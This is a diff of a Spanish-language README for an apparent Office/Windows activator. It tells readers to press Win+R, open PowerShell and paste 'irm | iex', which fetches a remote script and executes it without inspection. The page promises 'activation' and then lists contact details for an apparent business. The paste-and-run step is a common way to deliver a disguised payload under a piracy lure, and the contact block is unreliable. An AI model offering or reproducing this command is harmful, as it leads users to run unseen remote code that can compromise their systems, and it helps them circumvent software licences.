@@ -28,7 +28,22 @@ activador de office / descargar activador de office
 
 Sigue estos pasos simples para activar tu sistema:
 
-1. Presiona **Win + R**  
-2. En la ventana que aparece, escribe **PowerShell**  
-3. En la consola abierta, introduce el siguiente comando:  
+> 1. Presiona **Win + R**  
+> 2. En la ventana que aparece, escribe **PowerShell**  
+<img width="494" height="264" alt="Image" src="https://github.com/user-attachments/assets/f75f9d70-bf75-45f0-88f0-f62f010f2a86" />
 
+> 3. En la consola abierta, introduce el siguiente comando:  
+      ```powershell
+     irm  | iex
+     ```
+<img width="694" height="200" alt="Image" src="https://github.com/user-attachments/assets/62bc1d10-555f-487c-b4d8-573279280677" />
+
+> 4. Presiona Enter!
+
+## ✅ ¡Tu Windows quedará activado!
+
+## 📞 Contacto  
+- Dirección: 45 King William Street, London EC4R 9AN, UK  
+- Teléfono: +44 20 5876 3344  
+- Email: hello@winactiv.gsgt  
+- Horario: Lun–Vie 10:00–18:00, Sáb 09:30–14:30, Dom cerrado  
